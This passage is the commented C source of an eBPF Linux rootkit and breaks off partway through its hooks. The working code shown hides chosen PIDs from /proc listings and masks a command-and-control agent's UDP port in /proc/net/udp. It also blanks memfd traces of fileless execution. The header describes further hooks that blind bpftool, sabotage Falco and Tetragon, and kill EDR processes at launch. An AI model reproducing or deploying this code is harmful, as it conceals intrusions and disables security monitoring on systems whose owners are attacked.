/*
 * bpf_rootkit.bpf.c — eBPF rootkit: process hider + UDP network hider
 *
 * ── What is eBPF? ────────────────────────────────────────────────────
 * This file is compiled to eBPF bytecode (not regular x86 machine code).
 * It runs INSIDE the Linux kernel, not in userspace. The kernel's verifier
 * checks it before loading, then JIT-compiles it to native code.
 * Being in-kernel means: no userspace process, no file on disk, no entry
 * in ps — the rootkit is essentially invisible by design.
 *
 * ── What it hides and how ────────────────────────────────────────────
 * It hides two things:
 *
 * 1. PROCESSES (from ps, top, ls /proc, /proc/<PID>):
 *    Hook: getdents64 enter+exit
 *    When any process lists directory entries (readdir), we intercept the
 *    kernel's response and remove entries that match PIDs in pids_to_hide.
 *    Result: the process simply doesn't appear in /proc at all.
 *
 * 2. NETWORK PORT 20595 (from netstat, ss, lsof -i):
 *    Hook: openat + read (for /proc/net/udp — file-based ASCII table)
 *          recvmsg (for SOCK_DIAG netlink — used by ss and modern netstat)
 *          close (to clean up tracked file descriptors)
 *    Two separate mechanisms are needed because:
 *      - `netstat -anu` reads /proc/net/udp (ASCII text file)
 *      - `ss -anu` uses the SOCK_DIAG netlink protocol (binary, more modern)
 *    Both are patched in-memory before the tool's read() or recvmsg() returns.
 *
 * ── Additional capabilities ──────────────────────────────────────────
 *    bpf() syscall hide: intercepts BPF_PROG_GET_NEXT_ID to make bpftool
 *      show an empty program list (hides the rootkit from bpftool itself)
 *    Tetragon/Falco blocker: corrupts BPF_PROG_LOAD calls from EDR tools
 *      so they can't load their own hooks
 *    EDR process killer: kills falco, tetragon, sysdig, tracee, osquery
 *      on execve before they reach main()
 *    /proc/PID/exe hider: patches readlinkat to return /usr/bin/python3
 *      instead of "/memfd:[...] (deleted)" for hidden PIDs
 *    /proc/self/maps hider: blanks "memfd" lines to hide fileless execution
 *
 * ── Hidden port ──────────────────────────────────────────────────────
 * Port 20595 = 0x5073 (the C2 agent's UDP listening port)
 *   - In /proc/net/udp (ASCII): ":5073 " (hex lowercase, big-endian)
 *   - In SOCK_DIAG (binary): bytes 0x50, 0x73 at offset 20 (big-endian u16)
 *
 * ── Hooks tracepoint ─────────────────────────────────────────────────
 *   getdents64 enter+exit  → hide PIDs from /proc (ps/top/ls /proc)
 *   openat enter+exit      → detect when /proc/net/udp is being opened
 *   read enter+exit        → patch /proc/net/udp content (netstat -anu)
 *   close enter            → clean up tracked FDs (avoid FD reuse bugs)
 *   recvmsg enter+exit     → patch SOCK_DIAG netlink response (ss -anu)
 *   bpf enter+exit         → hide from bpftool, block EDR BPF loading
 *   execve exit            → kill EDR processes at startup
 *   readlinkat enter+exit  → hide /proc/PID/exe memfd path
 */
#include <linux/bpf.h>
#include <stdint.h>

typedef uint8_t  u8;
typedef uint16_t u16;
typedef uint32_t u32;
typedef uint64_t u64;
typedef int64_t  s64;
typedef int32_t  s32;

#define SEC(name) __attribute__((section(name), used))
#define __always_inline __attribute__((always_inline))

/* ── BPF helper function declarations ───────────────────────────────────
 * BPF programs cannot call arbitrary kernel functions directly. Instead,
 * they use a fixed set of "BPF helper functions" identified by integer IDs.
 * Each BPF_FUNC_* constant is an ID like 6, 7, 14... that the kernel maps
 * to a specific internal function.
 *
 * We declare them as function pointers and initialize them to the numeric ID
 * cast to a pointer. The BPF verifier and JIT compiler know how to handle
 * this: when it sees `call BPF_FUNC_map_lookup_elem`, it replaces it with a
 * call to the actual kernel function.
 *
 * Not using libbpf means we must declare these prototypes ourselves.
 * All are available since Linux 4.x unless otherwise noted.
 *
 * Key helpers used:
 *   bpf_get_current_pid_tgid : returns (tgid<<32 | pid) for the current task.
 *     TGID = thread group ID = what userspace calls "PID" (the main thread).
 *     PID  = actual thread ID. We use this as a unique key per thread.
 *   bpf_map_update_elem  : insert/update a key-value pair in a BPF map
 *   bpf_map_lookup_elem  : look up a key in a BPF map, returns pointer or NULL
 *   bpf_map_delete_elem  : remove a key from a BPF map
 *   bpf_probe_read_kernel: safely copy data FROM kernel memory (tracepoint arg)
 *   bpf_probe_read_user  : safely copy data FROM userspace memory
 *   bpf_probe_write_user : write data TO userspace memory ← the stealth primitive
 *     This helper is what allows modifying the data a syscall returns to a process.
 *     Requires license "GPL" in the BPF object.
 *   bpf_get_current_comm : get the process name (comm) of the current task,
 *     truncated to 16 bytes. Used to identify bpftool, tetragon, falco...
 *   bpf_send_signal      : send a signal to the current process (since Linux 5.3).
 *     Used with sig=9 (SIGKILL) to kill EDR tools on execve.
 */
static u64   (*bpf_get_current_pid_tgid)(void)
    = (void *)BPF_FUNC_get_current_pid_tgid;
static long  (*bpf_map_update_elem)(void *map, const void *key, const void *val, u64 flags)
    = (void *)BPF_FUNC_map_update_elem;
static void *(*bpf_map_lookup_elem)(void *map, const void *key)
    = (void *)BPF_FUNC_map_lookup_elem;
static long  (*bpf_map_delete_elem)(void *map, const void *key)
    = (void *)BPF_FUNC_map_delete_elem;
static long  (*bpf_probe_read_kernel)(void *dst, u32 size, const void *unsafe_ptr)
    = (void *)BPF_FUNC_probe_read_kernel;
static long  (*bpf_probe_read_user)(void *dst, u32 size, const void *unsafe_ptr)
    = (void *)BPF_FUNC_probe_read_user;
static long  (*bpf_probe_write_user)(void *unsafe_ptr, const void *src, u32 size)
    = (void *)BPF_FUNC_probe_write_user;
static long  (*bpf_get_current_comm)(void *buf, u32 size_of_buf)
    = (void *)BPF_FUNC_get_current_comm;
static long  (*bpf_send_signal)(u32 sig)
    = (void *)BPF_FUNC_send_signal;

/* ── Old-style map definitions (without BTF/libbpf) ─────────────────────
 * BPF maps are kernel data structures that can be read and written by BOTH
 * the BPF program (running in the kernel) and userspace (via the bpf() syscall).
 * Think of them as shared memory between the rootkit and the agent process.
 *
 * The "old-style" format (bpf_map_def struct in the "maps" ELF section) does
 * not require BTF (BPF Type Format) type information. This simplifies the
 * compiler toolchain and avoids including libbpf headers.
 *
 * General pattern used throughout:
 *   BPF_MAP_TYPE_HASH — a hash table:
 *     - Fast O(1) lookup by key
 *     - Key and value are fixed-size byte arrays
 *     - max_entries caps memory usage
 *
 * Inter-hook communication pattern:
 *   The "enter" hook (sys_enter_*) fires BEFORE the syscall executes.
 *     → At this point we know the syscall arguments (pointers, fd numbers).
 *     → We save them in a per-thread map keyed by pid_tgid.
 *   The "exit" hook (sys_exit_*) fires AFTER the syscall completes.
 *     → At this point we know the return value (bytes read, fd opened, etc.)
 *     → We retrieve the saved arguments from the map and perform the patch.
 *   This two-hook pattern is necessary because:
 *     - On enter: we know WHERE the buffer is, but it's not filled yet
 *     - On exit: the buffer is filled, but we would need to re-read the args
 *       (which the exit context doesn't provide — only enter does)
 */
struct bpf_map_def {
    unsigned int type;
    unsigned int key_size;
    unsigned int value_size;
    unsigned int max_entries;
    unsigned int map_flags;
};

/* ── Maps: process hider (getdents64 hooks) ──────────────────────────── */

/* pid_buf_map: passes the dirent buffer pointer from sys_enter to sys_exit.
 * Key: pid_tgid (u64) — uniquely identifies the current thread
 * Value: buf_ptr (u64) — userspace pointer to the getdents64 output buffer
 * Why: on sys_enter we know the buffer address (arg[1]), on sys_exit we need
 *      it to walk and patch the entries. This map bridges the two hooks. */
struct bpf_map_def SEC("maps") pid_buf_map = {
    .type        = BPF_MAP_TYPE_HASH,
    .key_size    = sizeof(u64),   /* pid_tgid */
    .value_size  = sizeof(u64),   /* userspace buffer pointer */
    .max_entries = 1024,          /* max 1024 concurrent getdents64 calls across all threads */
};

/* pids_to_hide: the list of PIDs to suppress from directory listings.
 * Key: PID (u32) — the process ID to hide
 * Value: u8 flag (1 = hide, checked but not used for anything else)
 * This map is populated by USERSPACE (via bpf_hider_add_pid) and READ by
 * the kernel BPF program. This is the cross-domain communication channel:
 * the agent adds its own PID here after launching, and the kernel silently
 * removes it from every getdents64 response. */
struct bpf_map_def SEC("maps") pids_to_hide = {
    .type        = BPF_MAP_TYPE_HASH,
    .key_size    = sizeof(u32),   /* PID */
    .value_size  = sizeof(u8),    /* flag (1 = hide this PID) */
    .max_entries = 64,            /* up to 64 PIDs can be hidden simultaneously */
};

/* ── Maps: network hider (openat/read/close hooks) ──────────────────────
 * Hiding a port from netstat/ss requires intercepting TWO different paths:
 *   Path A: /proc/net/udp (read as a text file by classic netstat)
 *   Path B: SOCK_DIAG netlink (binary protocol used by ss, modern netstat)
 * The maps below coordinate state across the multi-hook pipelines for both.
 */

/* openat_pending: marks that an openat() is in progress for a sensitive file.
 * Key: pid_tgid (u64)
 * Value: u8 type flag:
 *   1 = opening /proc/net/udp or /proc/net/udp6 (network hider path A)
 *   2 = opening /proc/self/maps or /proc/self/smaps (maps hider for memfd)
 * Set on sys_enter_openat, consumed on sys_exit_openat to record the FD. */
struct bpf_map_def SEC("maps") openat_pending = {
    .type        = BPF_MAP_TYPE_HASH,
    .key_size    = sizeof(u64),
    .value_size  = sizeof(u8),
    .max_entries = 256,
};

/* udp_fds: tracks open file descriptors for /proc/net/udp[6].
 * Key: pid_tgid, Value: fd (s32)
 * After sys_exit_openat records the FD, sys_enter_read checks this map to
 * know "is this read() call reading /proc/net/udp?". If yes, we intercept it. */
struct bpf_map_def SEC("maps") udp_fds = {
    .type        = BPF_MAP_TYPE_HASH,
    .key_size    = sizeof(u64),
    .value_size  = sizeof(s32),  /* signed because fd can theoretically be weird values */
    .max_entries = 256,
};

/* maps_fds: tracks open file descriptors for /proc/self/maps or smaps.
 * Same pattern as udp_fds but for the memfd hiding use case. */
struct bpf_map_def SEC("maps") maps_fds = {
    .type        = BPF_MAP_TYPE_HASH,
    .key_size    = sizeof(u64),
    .value_size  = sizeof(s32),
    .max_entries = 128,
};

/* maps_bufs: passes the read() buffer pointer from sys_enter_read to sys_exit_read
 * specifically for /proc/self/maps reads (to blank the "memfd" line). */
struct bpf_map_def SEC("maps") maps_bufs = {
    .type        = BPF_MAP_TYPE_HASH,
    .key_size    = sizeof(u64),
    .value_size  = sizeof(u64),  /* userspace buffer pointer */
    .max_entries = 128,
};

/* read_bufs: passes the read() buffer pointer from sys_enter_read to sys_exit_read
 * specifically for /proc/net/udp reads (to blank ":5073 " from the content). */
struct bpf_map_def SEC("maps") read_bufs = {
    .type        = BPF_MAP_TYPE_HASH,
    .key_size    = sizeof(u64),
    .value_size  = sizeof(u64),  /* userspace buffer pointer */
    .max_entries = 256,
};

/* nl_rbuf_map: passes the recvmsg iov buffer pointer from enter to exit hook.
 * Key: pid_tgid, Value: iov[0].iov_base pointer (userspace)
 * Used to patch the SOCK_DIAG binary netlink response — the data structure
 * that ss(8) uses to list UDP sockets. We modify the nlmsg_type field to
 * NLMSG_NOOP so that the socket entry is silently discarded by the tool. */
struct bpf_map_def SEC("maps") nl_rbuf_map = {
    .type        = BPF_MAP_TYPE_HASH,
    .key_size    = sizeof(u64),
    .value_size  = sizeof(u64),
    .max_entries = 512,          /* higher limit: ss may batch many recvmsg calls */
};

/* pending_bpf_calls: saves the bpf_attr pointer between sys_enter_bpf and
 * sys_exit_bpf. Used to intercept BPF_PROG_GET_NEXT_ID calls from bpftool
 * (cmd=11) and overwrite the next_id field to terminate enumeration early. */
struct bpf_map_def SEC("maps") pending_bpf_calls = {
    .type        = BPF_MAP_TYPE_HASH,
    .key_size    = sizeof(u64),
    .value_size  = sizeof(u64),  /* pointer to userspace bpf_attr struct */
    .max_entries = 256,
};

/* rl_pending: passes the readlinkat destination buffer pointer from enter to exit.
 * Used to patch /proc/PID/exe symlink results when the target is our agent.
 * On enter: save args[2] (the output buffer pointer).
 * On exit: if the result starts with "memfd:", overwrite with a fake path. */
struct bpf_map_def SEC("maps") rl_pending = {
    .type        = BPF_MAP_TYPE_HASH,
    .key_size    = sizeof(u64),
    .value_size  = sizeof(u64),  /* userspace destination buffer pointer */
    .max_entries = 64,
};

/* ── Tracepoint context structures ───────────────────────────────────────
 * When a tracepoint fires, the kernel passes a pointer to a "context" struct
 * as the argument to our BPF function. The layout is defined by the kernel's
 * trace event format (visible in /sys/kernel/tracing/events/syscalls/<name>/format).
 *
 * For ALL sys_enter_* tracepoints, the layout is:
 *   offset 0  : pad (u64) — common trace_entry fields (type, flags, pid...)
 *   offset 8  : syscall number (long id)
 *   offset 16 : args[0..5] — the 6 syscall arguments (u64 each)
 *
 * For ALL sys_exit_* tracepoints, the layout is:
 *   offset 0  : pad (u64)
 *   offset 8  : syscall number (long id)
 *   offset 16 : return value (long ret)
 *
 * We cannot directly dereference ctx->args[] in kernel BPF programs —
 * all reads from kernel memory must go through bpf_probe_read_kernel().
 * This is because the BPF verifier cannot prove these pointers are valid
 * without the helper's bounds checking.
 *
 * Example for getdents64(fd, buf, count):
 *   args[0] = fd   (directory file descriptor)
 *   args[1] = buf  (userspace pointer to the output dirent64 buffer)
 *   args[2] = count (buffer size in bytes)
 */
struct sys_enter_ctx {
    u64  pad;      /* 8 bytes: common trace_entry (opaque) */
    long id;       /* syscall number */
    u64  args[6];  /* syscall arguments: args[0]=arg1, args[1]=arg2, ... */
};
struct sys_exit_ctx {
    u64  pad;
    long id;
    long ret;      /* syscall return value (e.g., bytes read, fd number, 0/-errno) */
};

/* ── linux_dirent64 structure layout ─────────────────────────────────────
 * getdents64() fills a userspace buffer with an array of these variable-length
 * structures. Each entry describes one directory entry (a file or subdirectory).
 *
 * The key field for us is d_reclen: it is the total size (in bytes) of THIS
 * entry, including the variable-length d_name[] at the end. To walk the array,
 * we advance by d_reclen each iteration.
 *
 * ── Hiding technique (d_reclen merge / "absorb") ──────────────────────
 * To hide an entry without shifting the entire buffer (which would require
 * knowing the total length and doing memmove in BPF — impractical):
 *
 *   BEFORE:
 *     [prev_entry | d_reclen=40] [target_entry | d_reclen=32] [next_entry ...]
 *
 *   AFTER (we write prev_entry.d_reclen += target_entry.d_reclen):
 *     [prev_entry | d_reclen=72]                              [next_entry ...]
 *
 *   The kernel's readdir() consumer advances by d_reclen. After the patch,
 *   it jumps from prev_entry directly to next_entry, skipping the target.
 *   The target's bytes are still in memory but are never visited — invisible.
 *
 * This technique requires a "previous entry" to absorb into. The very first
 * entry cannot be hidden this way (we'd need to shift everything, impossible
 * in BPF without knowing the total buffer size). In practice, /proc lists PIDs
 * numerically, so our PID is rarely entry #1.
 */
struct dirent64_hdr {
    u64 d_ino;      /* inode number (offset 0, 8 bytes) */
    s64 d_off;      /* offset to the next dirent (offset 8, 8 bytes) */
    u16 d_reclen;   /* ← KEY FIELD: total size of this entry in bytes (offset 16, 2 bytes) */
    u8  d_type;     /* file type: DT_DIR=4 (offset 18, 1 byte) */
    /* char d_name[]: null-terminated name starts at offset 19 */
};
#define DIRENT64_NAME_OFF 19  /* offset of d_name[] in the dirent64 structure */

/* ── C2 Port signature in /proc/net/udp ─────────────────────────────────
 * Port 20595 decimal = 0x5073 hexadecimal.
 * /proc/net/udp lists UDP sockets in the format:
 *   sl  local_address rem_address   st ...
 *   0:  00000000:5073 00000000:0000 07 ...
 *          ↑ this is "IPADDR:PORT" both in hex, big-endian
 *
 * The 4 characters ":5073 " (colon + 4 hex digits + space) are what we
 * search for and replace with ":0000 " to blank out the port.
 *
 * We match on 4 individual character constants to allow the BPF verifier
 * to validate the comparison (it needs each access to be a constant index).
 */
#define PORT_C0 '5'   /* first hex digit of port 0x5073 */
#define PORT_C1 '0'   /* second hex digit */
#define PORT_C2 '7'   /* third hex digit */
#define PORT_C3 '3'   /* fourth hex digit */

/* ── name_to_pid : convert ASCII directory entry name to PID ─────────────
 * In /proc, each process has a directory named by its PID, e.g., "/proc/1234".
 * getdents64() returns these directory names as ASCII strings like "1234".
 * We need to parse them to compare against our pids_to_hide map.
 *
 * The function returns the numeric PID if the name consists of digits only
 * (i.e., it IS a PID directory), or 0 if the name contains non-digit characters
 * (e.g., "net", "self", "tty" — those are not PID directories, skip them).
 *
 * Why #pragma unroll?
 *   The BPF verifier requires ALL loops to be bounded (provably terminating).
 *   `#pragma unroll` tells clang to unroll the loop at compile time into a
 *   fixed sequence of if-checks, eliminating the loop entirely. This is the
 *   standard pattern for bounded loops in BPF programs.
 *
 * Why __always_inline?
 *   BPF programs have strict stack limits (512 bytes total). Inlining avoids
 *   call overhead and keeps stack usage predictable.
 */
static __always_inline u32 name_to_pid(const char *name, int len)
{
    u32 pid = 0;
    int valid = 1;
    #pragma unroll
    for (int i = 0; i < 8; i++) {  /* max PID on Linux is 4194304 = 7 digits, 8 is safe */
        if (i >= len) break;
        char c = name[i];
        if (c == '\0') break;                  /* end of name */
        if (c < '0' || c > '9') { valid = 0; break; }  /* non-digit = not a PID */
        pid = pid * 10 + (u32)(c - '0');       /* accumulate decimal value */
    }
    return valid ? pid : 0;   /* 0 = "not a PID name", caller must skip */
}

/* ═══════════════════════════════════════════════════════════════════════
 * [1/14] PROCESS HIDER — sys_enter_getdents64
 *
 * What:  Intercepts the beginning of every getdents64() syscall.
 * Why:   getdents64 is what the kernel uses when any program reads a directory
 *        (ps, top, ls /proc, /bin/ls, find...). By hooking it, we intercept
 *        ALL process listing attempts regardless of the tool used.
 * How:   On entry, args[1] is the userspace pointer to the dirent64 output
 *        buffer. We save it in pid_buf_map (keyed by pid_tgid) so the exit
 *        hook can find it when the syscall completes.
 *        At this point the buffer is EMPTY — the kernel hasn't filled it yet.
 * ═══════════════════════════════════════════════════════════════════════ */
SEC("tracepoint/syscalls/sys_enter_getdents64")
int tp_enter_getdents64(struct sys_enter_ctx *ctx)
{
    u64 pid_tgid = bpf_get_current_pid_tgid();
    u64 buf_ptr = 0;
    /* Read args[1] = the dirent64 output buffer pointer from the tracepoint context.
     * Must use bpf_probe_read_kernel() because ctx is kernel memory. */
    bpf_probe_read_kernel(&buf_ptr, sizeof(buf_ptr), &ctx->args[1]);
    /* Save for the exit hook — keyed by pid_tgid so concurrent calls don't collide */
    bpf_map_update_elem(&pid_buf_map, &pid_tgid, &buf_ptr, BPF_ANY);
    return 0;
}

/* ═══════════════════════════════════════════════════════════════════════
 * [2/14] PROCESS HIDER — sys_exit_getdents64
 *
 * What:  Walks the filled dirent64 buffer and removes entries for hidden PIDs.
 * Why:   At exit time, the kernel has already written all directory entries
 *        into the userspace buffer. We can now read and patch them.
 * How:   The d_reclen merge technique (also called "absorb"):
 *          For each dirent64 entry:
 *            1. Read its header (d_ino, d_off, d_reclen, d_type)
 *            2. Read the first 8 bytes of d_name (enough for any PID)
 *            3. Parse as a decimal PID; look it up in pids_to_hide
 *            4. If found AND there is a previous entry:
 *               → write (prev.d_reclen += this.d_reclen) to userspace
 *               → skip advancing prev pointers (entry is "absorbed")
 *            5. If not hidden: update prev pointers, advance offset
 *
 * The outer loop limit (128) satisfies the BPF verifier's bounded loop rule.
 * Real /proc directories rarely have more than ~100 entries anyway.
 * ═══════════════════════════════════════════════════════════════════════ */
SEC("tracepoint/syscalls/sys_exit_getdents64")
int tp_exit_getdents64(struct sys_exit_ctx *ctx)
{
    u64 pid_tgid = bpf_get_current_pid_tgid();

    long ret = 0;
    bpf_probe_read_kernel(&ret, sizeof(ret), &ctx->ret);
    if (ret <= 0) {
        /* syscall failed or returned 0 entries — clean up our saved pointer */
        bpf_map_delete_elem(&pid_buf_map, &pid_tgid);
        return 0;
    }

    /* Retrieve the buffer pointer saved by the enter hook */
    u64 *pbuf = bpf_map_lookup_elem(&pid_buf_map, &pid_tgid);
    if (!pbuf) return 0;
    u64 buf_ptr = *pbuf;
    bpf_map_delete_elem(&pid_buf_map, &pid_tgid);  /* consume it */

    u64 offset          = 0;    /* current position in the dirent buffer */
    u64 prev_reclen_off = 0;    /* byte offset of d_reclen field of the previous entry */
    u16 prev_reclen     = 0;    /* d_reclen value of the previous entry */

    for (int i = 0; i < 128; i++) {
        if (offset >= (u64)ret) break;  /* consumed all bytes returned by syscall */

        /* Read this entry's fixed-size header from userspace */
        struct dirent64_hdr hdr = {};
        if (bpf_probe_read_user(&hdr, sizeof(hdr),
                (void *)(buf_ptr + offset)) != 0) break;  /* unreadable = corrupt/done */
        if (hdr.d_reclen == 0 || hdr.d_reclen < sizeof(hdr)) break;  /* sanity check */

        /* Read up to 8 bytes of the entry name (enough for PID <= 9999999) */
        char name[8] = {};
        bpf_probe_read_user(name, sizeof(name),
                (void *)(buf_ptr + offset + DIRENT64_NAME_OFF));

        /* Try to interpret the name as a PID number */
        u32 pid = name_to_pid(name, 8);
        if (pid > 0) {
            u8 *hide = bpf_map_lookup_elem(&pids_to_hide, &pid);
            if (hide && *hide && prev_reclen_off > 0) {
                /* This PID should be hidden AND we have a previous entry to absorb into.
                 * Write the merged reclen to the PREVIOUS entry's d_reclen field.
                 * After this write, userspace walking the buffer will skip from
                 * prev_entry directly to the entry AFTER the hidden one. */
                u16 new_reclen = prev_reclen + hdr.d_reclen;
                bpf_probe_write_user(
                    (void *)(buf_ptr + prev_reclen_off),  /* &prev.d_reclen in userspace */
                    &new_reclen, sizeof(new_reclen));      /* expanded to swallow hidden entry */
                offset += hdr.d_reclen;  /* advance past hidden entry */
                /* Do NOT update prev_* — the hidden entry is now part of the previous one */
                continue;
            }
        }

        /* This entry is not hidden — it becomes the new "previous entry" */
        prev_reclen_off = offset + 16;   /* offset of d_reclen within this entry (offsetof = 16) */
        prev_reclen     = hdr.d_reclen;
        offset         += hdr.d_reclen;
    }
    return 0;
}

/* ═══════════════════════════════════════════════════════════════════════
 * [3/14] NETWORK HIDER — sys_enter_openat
 *
 * What:  Intercepts openat() calls and checks if the target file is one
 *        of the sensitive /proc paths we need to intercept.
 * Why:   Tools like `netstat -anu` open and read /proc/net/udp to list UDP
 *        sockets. By detecting this open(), we can intercept the subsequent
 *        read() to patch the content.
 * How:   Read args[1] (the filename pointer), read up to 24 bytes into a
 *        local BPF stack buffer, then compare byte-by-byte (no strcmp in BPF).
 *        If it matches a sensitive path, record in openat_pending with a type:
 *          type 1: network file (/proc/net/udp[6], /proc/self/net/udp[6])
 *                  → will patch ":5073 " in subsequent reads
 *          type 2: memory map file (/proc/self/maps, smaps, /proc/PID/maps)
 *                  → will blank "memfd:" lines in subsequent reads
 *
 * The comparison uses individual byte checks (fname[N]=='X') because:
 *   - BPF has no strcmp helper
 *   - The verifier requires all array accesses to be at constant indices
 *   - So all 24 comparisons must use literal numbers [0]..[23]
 * ═══════════════════════════════════════════════════════════════════════ */
SEC("tracepoint/syscalls/sys_enter_openat")
int tp_enter_openat(struct sys_enter_ctx *ctx)
{
    u64 pid_tgid = bpf_get_current_pid_tgid();

    /* args[1] = const char __user *filename */
    u64 fname_ptr = 0;
    bpf_probe_read_kernel(&fname_ptr, sizeof(fname_ptr), &ctx->args[1]);

    /* Read the first 24 bytes — covers /proc/self/net/udp6\0 (20 chars) */
    char fname[24] = {};
    if (bpf_probe_read_user(fname, 23, (void *)fname_ptr) != 0) return 0;

    /* All relevant paths start with /proc/ */
    if (!(fname[0]=='/' && fname[1]=='p' && fname[2]=='r' &&
          fname[3]=='o' && fname[4]=='c' && fname[5]=='/')) return 0;

    /* ── val=1 : "network" paths → patch port ":5073 " in the content ── */

    /* /proc/net/udp\0 (IPv4, classique) */
    if (fname[6]=='n' && fname[7]=='e' && fname[8]=='t' && fname[9]=='/' &&
        fname[10]=='u' && fname[11]=='d' && fname[12]=='p' && fname[13]=='\0') {
        u8 one = 1;
        bpf_map_update_elem(&openat_pending, &pid_tgid, &one, BPF_ANY);
        return 0;
    }
    /* /proc/net/udp6\0 (IPv6 — identical ":5073 " pattern) */
    if (fname[6]=='n' && fname[7]=='e' && fname[8]=='t' && fname[9]=='/' &&
        fname[10]=='u' && fname[11]=='d' && fname[12]=='p' && fname[13]=='6' &&
        fname[14]=='\0') {
        u8 one = 1;
        bpf_map_update_elem(&openat_pending, &pid_tgid, &one, BPF_ANY);
        return 0;
    }
    /* /proc/self/net/udp\0 (namespaced view — same content as /proc/net/udp) */
    if (fname[6]=='s' && fname[7]=='e' && fname[8]=='l' && fname[9]=='f' &&
        fname[10]=='/' && fname[11]=='n' && fname[12]=='e' && fname[13]=='t' &&
        fname[14]=='/' && fname[15]=='u' && fname[16]=='d' && fname[17]=='p' &&
        fname[18]=='\0') {
        u8 one = 1;
        bpf_map_update_elem(&openat_pending, &pid_tgid, &one, BPF_ANY);
        return 0;
    }
    /* /proc/self/net/udp6\0 */
    if (fname[6]=='s' && fname[7]=='e' && fname[8]=='l' && fname[9]=='f' &&
        fname[10]=='/' && fname[11]=='n' && fname[12]=='e' && fname[13]=='t' &&
        fname[14]=='/' && fname[15]=='u' && fname[16]=='d' && fname[17]=='p' &&
        fname[18]=='6' && fname[19]=='\0') {
        u8 one = 1;
        bpf_map_update_elem(&openat_pending, &pid_tgid, &one, BPF_ANY);
        return 0;
    }

    /* ── val=2 : "memory" paths → blank memfd lines in the content ── */

    /* /proc/self/maps\0 */
    if (fname[6]=='s' && fname[7]=='e' && fname[8]=='l' && fname[9]=='f' &&
        fname[10]=='/' && fname[11]=='m' && fname[12]=='a' && fname[13]=='p' &&
        fname[14]=='s' && fname[15]=='\0') {
        u8 two = 2;
        bpf_map_update_elem(&openat_pending, &pid_tgid, &two, BPF_ANY);
        return 0;
    }
    /* /proc/self/smaps\0 (detailed view — same memfd IOC visible) */
    if (fname[6]=='s' && fname[7]=='e' && fname[8]=='l' && fname[9]=='f' &&
        fname[10]=='/' && fname[11]=='s' && fname[12]=='m' && fname[13]=='a' &&
        fname[14]=='p' && fname[15]=='s' && fname[16]=='\0') {
        u8 two = 2;
        bpf_map_update_elem(&openat_pending, &pid_tgid, &two, BPF_ANY);
        return 0;
    }

    /* ── /proc/NUMERIC_PID/{maps,smaps,net/udp,net/udp6} ────────────────
     * Covers the case where the investigator knows the PID through another vector.
     * Constant indices in the macro → BPF verifier accepts without BTF.
     * PID is checked in pids_to_hide before any map access. */
    if (fname[6] >= '1' && fname[6] <= '9') {
        u32 pid = (u32)(fname[6] - '0');
/* _CHK(S) : tests if fname[S] == '/' followed by maps, smaps or net/udp[6]
 * and if pid is in pids_to_hide. Indices S, S+1..S+9 all constant. */
#define _CHK(S) \
    if (bpf_map_lookup_elem(&pids_to_hide, &pid)) { \
        u8 _v = 0; \
        if (fname[(S)]=='/' && fname[(S)+1]=='m' && fname[(S)+2]=='a' && \
            fname[(S)+3]=='p' && fname[(S)+4]=='s' && fname[(S)+5]=='\0') _v=2; \
        if (!_v && fname[(S)]=='/' && fname[(S)+1]=='s' && fname[(S)+2]=='m' && \
            fname[(S)+3]=='a' && fname[(S)+4]=='p' && fname[(S)+5]=='s' && \
            fname[(S)+6]=='\0') _v=2; \
        if (!_v && fname[(S)]=='/' && fname[(S)+1]=='n' && fname[(S)+2]=='e' && \
            fname[(S)+3]=='t' && fname[(S)+4]=='/' && fname[(S)+5]=='u' && \
            fname[(S)+6]=='d' && fname[(S)+7]=='p') { \
            if (fname[(S)+8]=='\0') _v=1; \
            else if (fname[(S)+8]=='6' && fname[(S)+9]=='\0') _v=1; \
        } \
        if (_v) { bpf_map_update_elem(&openat_pending, &pid_tgid, &_v, BPF_ANY); return 0; } \
    }
        _CHK(7)   /* PID 1 digit  : /proc/N/...    */
        if (fname[7] >= '0' && fname[7] <= '9') {
            pid = pid*10 + (u32)(fname[7]-'0');
            _CHK(8)   /* PID 2 digits : /proc/NN/...   */
            if (fname[8] >= '0' && fname[8] <= '9') {
                pid = pid*10 + (u32)(fname[8]-'0');
                _CHK(9)   /* PID 3 digits */
                if (fname[9] >= '0' && fname[9] <= '9') {
                    pid = pid*10 + (u32)(fname[9]-'0');
                    _CHK(10)  /* PID 4 digits */
                    if (fname[10] >= '0' && fname[10] <= '9') {
                        pid = pid*10 + (u32)(fname[10]-'0');
                        _CHK(11)  /* PID 5 digits */
                        if (fname[11] >= '0' && fname[11] <= '9') {
                            pid = pid*10 + (u32)(fname[11]-'0');
                            _CHK(12)  /* PID 6 digits */
                            if (fname[12] >= '0' && fname[12] <= '9') {
                                pid = pid*10 + (u32)(fname[12]-'0');
                                _CHK(13)  /* PID 7 digits */
                            }
                        }
                    }
                }
            }
        }
#undef _CHK
    }
    return 0;
}

/* ═══════════════════════════════════════════════════════════════════════
 * [4/14] NETWORK HIDER — sys_exit_openat
 *
 * What:  Records the file descriptor returned by openat() for sensitive paths.
 * Why:   On sys_enter we knew the FILENAME but not yet the FD (it didn't exist).
 *        On sys_exit the kernel has opened the file and returned the FD.
 *        We need the FD to intercept the subsequent read() for that specific file.
 * How:   Check openat_pending for our pid_tgid. If found:
 *          - Consume the pending entry (delete from map)
 *          - Read the return value (ret = new file descriptor)
 *          - Store fd in udp_fds (type 1) or maps_fds (type 2)
 *        Now when read() is called with that FD, we know to intercept it.
 * ═══════════════════════════════════════════════════════════════════════ */
SEC("tracepoint/syscalls/sys_exit_openat")
int tp_exit_openat(struct sys_exit_ctx *ctx)
{
    u64 pid_tgid = bpf_get_current_pid_tgid();

    u8 *pending = bpf_map_lookup_elem(&openat_pending, &pid_tgid);
    if (!pending) return 0;
    u8 ptype = *pending;
    bpf_map_delete_elem(&openat_pending, &pid_tgid);

    long ret = 0;
    bpf_probe_read_kernel(&ret, sizeof(ret), &ctx->ret);
    if (ret <= 0) return 0;

    s32 fd = (s32)ret;
    if (ptype == 1)
        bpf_map_update_elem(&udp_fds,  &pid_tgid, &fd, BPF_ANY);
    else if (ptype == 2)
        bpf_map_update_elem(&maps_fds, &pid_tgid, &fd, BPF_ANY);
    return 0;
}

/* ═══════════════════════════════════════════════════════════════════════
 * [5/14] NETWORK HIDER — sys_enter_read
 *
 * What:  For read() calls on our tracked FDs, save the output buffer pointer.
 * Why:   When the tool reads /proc/net/udp, it provides a userspace buffer.
 *        We need this buffer's address to patch its contents on exit.
 * How:   Check if args[0] (the fd) matches any fd in udp_fds or maps_fds.
 *        If yes, save args[1] (userspace buffer pointer) in read_bufs or maps_bufs.
 *        The exit hook will use this pointer to read and patch the buffer content.
